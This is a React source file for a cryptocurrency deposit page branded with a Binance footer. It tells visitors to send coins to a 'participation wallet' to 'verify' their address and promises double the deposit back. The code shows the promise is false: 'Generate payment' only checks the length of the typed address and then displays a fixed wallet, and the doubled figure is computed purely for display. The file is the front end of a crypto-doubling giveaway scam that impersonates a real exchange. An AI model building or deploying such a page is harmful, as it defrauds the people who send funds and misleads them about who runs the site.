/* eslint-disable react/prop-types */
import { useState } from "react";
import Spinner from "../assets/spinner.svg";
import LiveChat from "./LiveChat";

export default function Pay({ Address, Icon, symbol, Qr, Name, Min, Max }) {
  const [amount, setAmount] = useState("");
  const [approve, setApporve] = useState(false);
  const [copied, setCopied] = useState(false);
  const [value, setValue] = useState(false);
  const [pay, setPay] = useState(false);
  const [user, setUser] = useState("");

  function handleAmount(event) {
    const inputValue = parseFloat(event.target.value);
    if (isNaN(inputValue) || inputValue < Min) {
      setAmount(0);
    } else {
      setAmount(inputValue * 2);
    }
  }

  function handleApprove() {
    if (user.length > 10) {
      setApporve(true);
      setPay(true);
    } else {
      alert("Plese enter receipent wallet address");
    }
  }

  function generate(event) {
    const userAddress = event.target.value;
    setUser(userAddress);
  }

  const copyText = () => {
    navigator.clipboard
      .writeText(Address)
      .then(() => {
        setCopied(true);
        setTimeout(() => {
          setCopied(false);
        }, 2000);
      })
      .catch((err) => {
        console.error("Failed to copy: ", err);
      });
  };

  const copyAmount = () => {
    navigator.clipboard
      .writeText(amount / 2)
      .then(() => {
        setValue(true);
        setTimeout(() => {
          setValue(false);
        }, 2000);
      })
      .catch((err) => {
        console.error("Failed to copy: ", err);
      });
  };

  return (
    <div className="css-1bx211v container">
      <div className="css-1rs9gl">
        <div className="rules">
          <div>
            <p className="small-text">
              To verify your Address, You are required to make deposit into the
              reward pool. You will receive a 2x of the deposit made to the
              generated address.
            </p>
          </div>
          <div>
            <div className="richtext-container list-text">
              <p>
                Step1: Make sure you have at least {Min} {symbol} or above in
                your wallet.
              </p>
              <p>Step2: Enter the amount you wish to invest below.</p>
              <p>Step3: Enter your {symbol} address</p>
              <p>
                Step4: Click the Generate Payment button to generate the payment
                address.
              </p>
              <p>Step5: Make deposit to generated address.</p>
              <p>Step6: Confirm payment.</p>
              <p>Step7: Wait for at least 10 - 18 minutes.</p>
            </div>
          </div>
        </div>
        <div className="calculate">
          <div className="calculator participateLeft">
            <div className="calculatorInput formContainer">
              <div className="title"> Enter the amount </div>
              <div className="block">
                <div className="info">
                  <div className="header">
                    <img
                      src={Icon}
                      alt="Binance coin"
                      className="icon"
                      width="24"
                    />
                    <span className="name">{Name}</span>
                  </div>
                </div>
                <div className="formGroup">
                  <div>
                    <label className="input">
                      <input
                        onChange={handleAmount}
                        placeholder="Enter Amount"
                        type="number"
                      />
                      <span className="currency">{symbol}</span>
                    </label>
                    <div className="group">
                      <small className="small">
                        {" "}
                        Min:{" "}
                        <span>
                          {Min} {symbol}
                        </span>
                      </small>
                      <small className="small">
                        {" "}
                        Max:{" "}
                        <span>
                          {Max} {symbol}
                        </span>
                      </small>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="calculatorInput formContainer">
              <div className="title">
                {" "}
                Amount to receive <span>2X</span> back{" "}
              </div>
              <div className="block">
                <div className="info">
                  <div className="header">
                    {" "}
                    <img
                      src={Icon}
                      alt="Binance coin"
                      className="icon"
                      width="24"
                    />{" "}
                    <span className="name">{Name}</span>
                  </div>
                </div>
                <div>
                  <label className="input">
                    <input
                      defaultValue={amount}
                      placeholder="Waiting for input..."
                      type="number"
                    />
                    <span className="currency">{symbol}</span>
                  </label>
                </div>
              </div>
              <div className="formInput-2 formInput  formInputWithButton">
                <p>Recipient Address</p>
                <input
                  onChange={generate}
                  className="input currency"
                  placeholder="enter receivers wallet address"
                  type="text"
                />
                <button
                  onClick={handleApprove}
                  className={approve ? "clicked" : ""}
                >
                  {approve ? "Generated" : "Generate payment"}
                </button>
              </div>
            </div>
          </div>
          <div className="form formContainer participateRight">
            {pay ? (
              <>
                <div className="title">
                  <p>
                    {" "}
                    Make a transfer to the <span>specified</span> address to
                    receive <span>2X</span> back{" "}
                  </p>
                  <div className="waiting">
                    <img width="24" src={Spinner} />
                    <span>Waiting for payment</span>
                  </div>
                </div>
                <div className="formGroup">
                  <div className="formInput formInputWithButton">
                    <p>Participation wallet</p>
                    <div className="input">
                      <div className="value">{Address}</div>
                    </div>
                    <button onClick={copyText} className="">
                      {copied ? "Copied!" : "Copy address"}
                    </button>
                  </div>
                  <div className="formInput formInputWithButton">
                    <p>Participation amount</p>
                    <div className="input">
                      <span className="errorText">
                        {" "}
                        The minimum value allowed is
                        {Min} {symbol}
                      </span>
                      <span>{symbol}</span>
                    </div>
                    <button onClick={copyAmount} className="">
                      {value ? "Copied!" : "Copy Amount"}
                    </button>
                  </div>
                  <div className="qr">
                    <img
                      src={Qr}
                      className="canvas"
                      width={132}
                      height={132}
                    ></img>{" "}
                  </div>
                </div>
              </>
            ) : (
              ""
            )}
          </div>
        </div>
        <div className="css-223shg">
          <div data-bn-type="text" className="css-vurnku">
            Binance © 2023
          </div>
        </div>
      </div>
      <LiveChat />
    </div>
  );
}
